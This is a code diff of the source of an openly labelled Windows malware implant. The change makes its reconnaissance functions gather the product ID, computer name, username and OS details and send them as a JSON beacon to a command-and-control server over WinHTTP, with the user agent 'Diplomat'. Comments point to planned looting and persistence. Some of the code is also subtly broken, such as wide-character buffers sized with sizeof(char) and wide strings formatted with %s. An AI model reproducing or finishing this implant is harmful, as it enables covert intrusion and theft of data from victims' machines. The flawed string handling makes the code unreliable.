@@ -30,6 +30,11 @@ void NetworkInterfaces(){
 
 }
 
+// List environment variables
+void EnvVariables(){
+
+}
+
 // Print all running processes
 void RunningProcesses(){
     HANDLE hSnap;
@@ -49,35 +54,43 @@ void RunningProcesses(){
 }
 
 // Identify system using product ID
-void ProductID(){
-    char value[30];
-	DWORD size = 30*sizeof(char);
-	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductId", RRF_RT_REG_SZ, NULL, (PVOID)&value, &size);
-	printf("value: %s\n", value);
+wchar_t* ProductID(){
+    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));
+	DWORD size = 30*sizeof(wchar_t);
+	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductId", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
+    return value;
 }
 
-// Retrieve computer name (potentially switch to GetComputerNameEx from sysinfoapi.h)
-void ComputerName(){
-    char value[30];
+// Retrieve computer name
+wchar_t* ComputerName(){
+    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));;
 	DWORD size = 30*sizeof(char);
-	RegGetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", "ComputerName", RRF_RT_REG_SZ, NULL, (PVOID)&value, &size);
-	printf("value: %s\n", value);
+	RegGetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", "ComputerName", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
+	return value;
 }
 
-// Retrieve current user (TODO get token)
-void CurrentUser(){
-    char value[30];
+// Retrieve current user
+wchar_t* CurrentUser(){
+    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));;
 	DWORD size = 30*sizeof(char);
-	RegGetValue(HKEY_CURRENT_USER, "Volatile Environment", "USERNAME", RRF_RT_REG_SZ, NULL, (PVOID)&value, &size);
-	printf("value: %s\n", value);
+	RegGetValue(HKEY_CURRENT_USER, "Volatile Environment", "USERNAME", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
+	return value;
 }
 
-// Windows display version (potentially switch to sysinfoapi.h implementation)
-void WindowsVersion(){
-    char value[30];
+// Windows release
+wchar_t* OSName(){
+    wchar_t* name = (wchar_t*)malloc(30*sizeof(wchar_t));
+    DWORD size = 30*sizeof(char);
+    RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", RRF_RT_REG_SZ, NULL, (PVOID)name, &size);
+    return name;
+}
+
+// Windows build
+wchar_t* OSVersion(){
+    wchar_t* build = (wchar_t*)malloc(30*sizeof(wchar_t));
 	DWORD size = 30*sizeof(char);
-	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DisplayVersion", RRF_RT_REG_SZ, NULL, (PVOID)&value, &size);
-	printf("value: %s\n", value);
+	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild", RRF_RT_REG_SZ, NULL, (PVOID)build, &size);
+    return build;
 }
 
 // List files in directory
@@ -95,7 +108,8 @@ void ls(char* path){
     }
 }
 
-void RegisterC2(_TCHAR* gid){
+
+void RegisterC2(){
 
     HINTERNET session = WinHttpOpen(
         L"Diplomat", 
@@ -127,8 +141,13 @@ void RegisterC2(_TCHAR* gid){
             
             if(request){
                 wchar_t* headers = L"Content-Type: application/json\r\n";
-                char* jsonData = (char*) malloc(128);
-                sprintf(jsonData, "{ \"gid\": %s }", gid);
+                char* jsonData = (char*) malloc(512);
+                wchar_t* productID = ProductID();
+                wchar_t* OSRelease = OSName();
+                wchar_t* OSBuild = OSVersion();
+                wchar_t* username = CurrentUser();
+                wchar_t* computerName = ComputerName();
+                sprintf(jsonData, "{ \"ProductID\": \"%s\", \"OSName\": \"%s\", \"OSBuild\": \"%s\", \"Username\": \"%s\", \"ComputerName\": \"%s\" }", productID, OSRelease, OSBuild, username, computerName);
                 size_t size = strlen(jsonData) * sizeof(char);
 
                 BOOL result = WinHttpSendRequest(
@@ -166,27 +185,25 @@ void RegisterC2(_TCHAR* gid){
 }
 
 int _tmain(int argc, _TCHAR *argv[]){
-    /*
-    if(argc == 2){
+
+    if(argc == 1){
         // Report intrusion to C2
-        _TCHAR* gid = malloc(64);
-        sprintf(gid, "239");
-        RegisterC2(gid);
+        RegisterC2();
     }
-    */
 
     // Do malware things (investigation, looting, persistence)
 
     // Situational Awareness tasks
     //RunningProcesses();
     //ls(".");
-    //ProductID();
+    //wchar_t* productID = ProductID();
+    //printf("%s\n", productID);
     //ComputerName();
     //CurrentUser();
-    //WindowsVersion();
+    //OSVersion();
     //NetworkInterfaces();
 
-    
+
     /*
 
     // Establish peer network
